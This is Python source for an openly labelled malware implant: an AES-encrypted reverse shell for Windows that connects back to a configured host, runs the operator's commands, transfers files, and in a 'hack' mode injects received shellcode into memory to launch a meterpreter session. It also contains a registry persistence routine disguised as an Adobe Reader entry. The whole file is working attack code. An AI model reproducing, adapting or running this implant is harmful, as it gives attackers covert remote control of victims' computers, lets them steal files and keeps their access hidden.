#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
    @Malware
    ST2Labs / GEO SYSTEM SOFTWARE
 
    Python Reverse Shell / Post-Explotation
 
    This code is base on:
        http://www.primalsecurity.net/
        Post: /0xc-python-tutorial-python-malware
"""
import sys
import base64
import os
import socket
import re
from Crypto.Cipher import AES
from Crypto import Random

#Crypt Class
BS = 16
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
unpad = lambda s : s[0:-ord(s[-1])]


class AESCipher:

    def __init__( self, key ):
        self.key = key

    def encrypt( self, raw ):
        raw = pad(raw)
        iv = Random.new().read( AES.block_size )
        cipher = AES.new( self.key, AES.MODE_CBC, iv )
        return base64.b64encode( iv + cipher.encrypt( raw ) )

    def decrypt( self, enc ):
        enc = base64.b64decode(enc)
        iv = enc[:16]
        cipher = AES.new(self.key, AES.MODE_CBC, iv )
        return unpad(cipher.decrypt( enc[16:] ))


#Method to keep process into windows run
def autorun(tempdir, fileName, run):
    # Copy executable to %TEMP%:
    os.system('copy %s %s' % (fileName, tempdir))
 
    # Queries Windows registry for the autorun key value
    # Stores the key values in runkey array
    key = OpenKey(HKEY_LOCAL_MACHINE, run)
    runkey = []
    try:
        i = 0
        while True:
            subkey = EnumValue(key, i)
            #print subkey[0]
            runkey.append(subkey[0])
            i += 1
    except WindowsError:
        pass
 
    # If the autorun key "Adobe ReaderX" isn't set this will set the key:
    if 'Adobe ReaderX' not in runkey:
        try:
            key = OpenKey(HKEY_LOCAL_MACHINE, run, 0, KEY_ALL_ACCESS)
            SetValueEx(key, 'Adobe_ReaderX', 0, REG_SZ, r"%TEMP%\rsh.exe")
            key.Close()
        except WindowsError:
            pass
 
 
# Decode Base64 data
def decode(data):
    if len(data) % 4 != 0:  # check if multiple of 4
        while len(data) % 4 != 0:
            data = data + "="
        req_str = base64.b64decode(data)
    else:
        req_str = base64.b64decode(data)
    return req_str

# Decode Cipher+Base64 data
def decodeCipher(aes, data):
    if len(data) % 4 != 0:  # check if multiple of 4
        while len(data) % 4 != 0:
            data = data + "="
        req_str = base64.b64decode(data)
    else:
        req_str = base64.b64decode(data)
    msg = aes.decrypt( req_str ) 
    return msg
 
 
# Encode Cipher+Base64 data
def encodeCipher(aes, data):
    encryp_msg = aes.encrypt(data)
    return base64.b64encode(encryp_msg)
 
 
# Get JSON Configuration from file code with Base64
def getconfig(name):
    import json
    with open(name, 'rb') as f:
        d = json.loads(decode(f.read()))
        return d
 
# Run the command
def command(cmd):
    import subprocess
    import shlex
    args = shlex.split(cmd)

    try:
        p = subprocess.Popen(args, shell=True, stdout=subprocess.PIPE)
        out_, err_ = p.communicate()
        if p.returncode != 0:
            return "Command not valid"
        else:
            return out_
    except:
        return "Command not valid"

#Launch meterpreter shell
def hack(code):    
    import ctypes

    shellcode=bytearray(code)
    
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                              ctypes.c_int(len(shellcode)),
                                              ctypes.c_int(0x3000),
                                              ctypes.c_int(0x40))
     
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
     
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                         buf,
                                         ctypes.c_int(len(shellcode)))
     
    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                             ctypes.c_int(0),
                                             ctypes.c_int(ptr),
                                             ctypes.c_int(0),
                                             ctypes.c_int(0),
                                             ctypes.pointer(ctypes.c_int(0)))
     
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))

#Sent File Method
def sent(ip, aes, fileName):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, int(5443)))
    f = open(fileName,'rb')
    print f
    print 'Sending...'
    l = f.read(1024)
    while (l):
        print 'Sending...'
        s.send(l)
        l = f.read(1024)
    f.close()
    print "Done Sending"
    s.close()
    
#Receive File Method
def receive(aes, fileName):
    # Create a TCP/IP socket
    sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Bind the socket to the address given on the command line
    server_address2 = ('', 5443)
    sock2.bind(server_address2)
    sock2.listen(5)
    con2, client_address2 = sock2.accept()
        
    f = open(fileName,'wb')
    print f
    #con.listen(5)                 # Now wait for client connection.
    print "Receiving..."
    l = con2.recv(1024)
    while (l):
        print "Receiving..."
        f.write(l)
        l = con2.recv(1024)
    f.close()
    con2.close()                # Close the connection
    print "Done Receiving"  


def shell(ip, port):
    #CipherAES Object
    aes = AESCipher( 'yibEejptfvGvuidg') #50 Characs
    #Code to set hack mode
    code = "0"
    #Base64 encoded reverse shell
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        msg = '[*] Connection Established!'
        s.send(encodeCipher(aes, msg))
        while 1:
            cmd = decodeCipher(aes, s.recv(4096)) #Set to 4096 the buffer command, to allow send shellcode
            if cmd == "quit":
                response = "Se ha cerrado la conexion"
                encoded = encodeCipher(aes, response)
                s.send(encoded)
                break
            elif cmd == 'upload':
                response = "¿Cual es el nombre que quiere que tenga en el destino (indique ext): "           
                encoded = encodeCipher(aes, response)
                s.send(encoded)
                fileame = decodeCipher(aes, s.recv(4096)) #Receive filename
                print filename
                encoded = encodeCipher(aes, 'OK')
                s.send(encoded)
                receive(aes, filename)
            elif cmd == 'download':
                response = "¿Cual es la ruta del fichero?: "           
                encoded = encodeCipher(aes, response)
                s.send(encoded)
                filename = decodeCipher(aes, s.recv(4096)) #Receive filename
                print filename
                encoded = encodeCipher(aes, 'OK')
                s.send(encoded)
                sent(s.getpeername()[0], aes, filename)
            elif cmd == "hack":
                response = "Se ha habilitado la ejecucion de ShellCode remoto"            
                encoded = encodeCipher(aes, response)
                s.send(encoded)
                code = "1"
            elif code == "1":
                code = "0"
                if cmd == 'error':
                    response = "Saliendo del modo hack debido a un error - No se ha enviado un ShellCode correcto"
                    encoded = encodeCipher(aes, response)
                    s.send(encoded)
                else:
                    response = "Se ha ejecutado el ShellCode"        
                    encoded = encodeCipher(aes, response)
                    s.send(encoded)
                    hack(cmd)
                    break
            elif cmd == 'ok':
                response = "ok"        
                encoded = encodeCipher(aes, response)
                s.send(encoded)
            else:  #Execute remote command
                response = command(cmd)
                # Here is where must implement action stuff
                # response is result to exceute action
                encoded = encodeCipher(aes, response)
                s.send(encoded)           
    finally:
        s.close()
 
 
def main():
    try:
        #tempdir = '%TEMP%'
        #fileName = sys.argv[0]
        #run = "Software\Microsoft\Windows\CurrentVersion\Run"
        #autorun(tempdir, fileName, run)
        conf = getconfig('conf.ini')
        shell(conf['ip'], conf['port'])
    except KeyboardInterrupt:
        sys.exit(2)
 
if __name__ == "__main__":
        main()
